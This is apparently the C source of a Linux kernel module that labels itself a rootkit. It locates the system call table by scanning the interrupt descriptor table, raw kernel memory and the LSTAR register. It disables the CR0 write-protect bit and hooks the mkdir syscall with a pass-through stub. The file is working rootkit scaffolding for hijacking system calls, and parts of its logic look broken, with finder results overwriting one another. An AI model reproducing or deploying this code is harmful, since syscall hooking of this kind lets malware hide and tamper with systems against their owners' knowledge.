#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/file.h>
#include <linux/dirent.h>
#include <linux/fs_struct.h>
#include <linux/sched.h>
#include <linux/fdtable.h>
#include <linux/errno.h>
#include <linux/list.h>
#include <net/tcp.h>
#include <linux/in.h>
//define rtprint
#define rtprint(fmt, args...) printk("%s:"fmt"\n", "rootkit", ##args)

// define a struct to save system call
#define RT_SYSCALL_DEFINE(ret, name, args...) \
union {\
    unsigned long val;\
    asmlinkage ret (*fuc)(args);\
}orig_sys_##name;\
asmlinkage ret rt_sys_##name(args)

// call the original function
#define RT_SYSCALL_CALL(name, args...) (orig_sys_##name.fuc(args))

// replace the original system call
#define RT_SYSCALL_REPLACE(name) {\
orig_sys_##name.val = sys_call_table[__NR_##name];\
sys_call_table[__NR_##name] = (unsigned long)(rt_sys_##name);\
}

// restore the system call
#define RT_SYSCALL_RESTORE(name) {\
sys_call_table[__NR_##name] = (unsigned long)(orig_sys_##name.val);\
}


typedef struct _RT_IDTR {
    unsigned short limit;
    unsigned int base;
} __attribute__ ((packed)) RT_IDTR, *PRT_IDTR;

typedef struct _RT_IDT {
    unsigned short off1; /*offset bits 0..15*/
    unsigned short sel; /*a code segment selector in GDT or LDT*/
    unsigned char none, flags; /*unused, set to 0 , *type and attributes*/
    unsigned short off2; /*offset bits 16..31*/
} __attribute__ ((packed)) RT_IDT, *PRT_IDT;

unsigned long *sys_call_table;
unsigned int reg_cr0 = 0;

void write_begin(void)
{
    unsigned int cr0 = 0;

    asm volatile ("movl %%cr0, %%eax":"=a"(cr0));
    
    reg_cr0 = cr0;

    // clear the 20 bit of CR0, a.k.a WP bit
    cr0 &= 0xfffeffff;

    asm volatile ("movl %%eax, %%cr0":: "a"(cr0));
}

// set CR0 with new value
void write_end(void)
{
    asm volatile ("movl %%eax, %%cr0":: "a"(reg_cr0));
}

RT_SYSCALL_DEFINE(long, mkdir, const char *pathname, mode_t mode) {
    //printk("mkdir-%s", pathname);
    return RT_SYSCALL_CALL(mkdir, pathname,mode);
}

unsigned long * find_sys_call_table1(void) {
    RT_IDTR idtr;
    PRT_IDT pidt;
    unsigned int sys_call_off;
    unsigned long * pret = NULL;
    char* p;
    int i;

    // get value of idtr
    asm("sidt %0" : "=m"(idtr));
    rtprint("idtr.base-0x%x", idtr.base);
    rtprint("idtr.limit-0x%x", idtr.limit);

    // get IDT
    pidt = (PRT_IDT) (idtr.base + 8 * 0x80);
    rtprint("pidt.off1-0x%x", pidt->off1);
    rtprint("pidt.sel-0x%x", pidt->sel);
    rtprint("pidt.flags-0x%x", pidt->flags);
    rtprint("pidt.off2-0x%x", pidt->off2);
    
    // get system_call offset
    sys_call_off = ((pidt->off2 << 16) | pidt->off1);
    rtprint("rootkit:sys_call_off-0x%x", sys_call_off);
    // find sys_call_table
    p = (char *) sys_call_off;

    for (i = 0; i < 100; i++) {
        if (p[i] == '\xff' && p[i + 1] == '\x14' && p[i + 2] == '\x85') {
            pret = (unsigned long*) (*(unsigned int*) (p + i + 3));
        }
    }
    if (pret == NULL) {
        rtprint("find_sys_call_table1== NULL ");
        return NULL;
    } else {
        rtprint("find_sys_call_table1!!!find![0x%lx]", \
                (long unsigned int) pret);
    }
    return pret;
}

unsigned long * find_sys_call_table2(void) {
    unsigned long *start;
    for (start = (unsigned long *) 0xc0000000; \
            start < (unsigned long *) 0xffffffff; start++) {
        if (start[__NR_close] == (unsigned long) sys_close) {
            rtprint("find_sys_call_table2!!!find![0x%x]",(unsigned int) start);
            return start;
        }
    }
    rtprint("find_sys_call_table2:sys_call_table == NULL ");
    return NULL;  
}

unsigned long * find_sys_call_table3(void)
{
    unsigned long lstar;
    unsigned long index;

    rdmsrl(MSR_LSTAR, lstar);
    for (index = 0; index <= PAGE_SIZE; index += 1) {
        unsigned long *arr = (unsigned long *)lstar + index;

        if (arr[0] == 0xff && arr[1] == 0x14 && arr[2] == 0xc5) {
            rtprint("find_sys_call_table3!!!find![0x%lx]",(long unsigned int) arr);
            return arr + 3;
        }
    }
    rtprint("find_sys_call_table3:sys_call_table == NULL ");
    return NULL;
}

static int __init
ThisInit(void) {
    rtprint("Enter init function");
    sys_call_table = find_sys_call_table1();
    sys_call_table = find_sys_call_table2();
    sys_call_table = find_sys_call_table3();
    rtprint("sys_call_table = find_sys_call_table() finished!");
    rtprint("disable_write_protection");
    write_begin();
    RT_SYSCALL_REPLACE(mkdir); //39
    write_end();
    rtprint("enable_write_protection");
    rtprint("Leave init function");

    return 0;
}

static void __exit
ThisExit(void) {
    rtprint("Enter exit function");
    //return;
    rtprint("disable_write_protection");
    write_begin();  
    RT_SYSCALL_RESTORE(mkdir); //39
    write_end();
    rtprint("enable_write_protection");
    rtprint("Leave exit function");
}
MODULE_LICENSE("GPL");
module_init(ThisInit); 
module_exit(ThisExit); 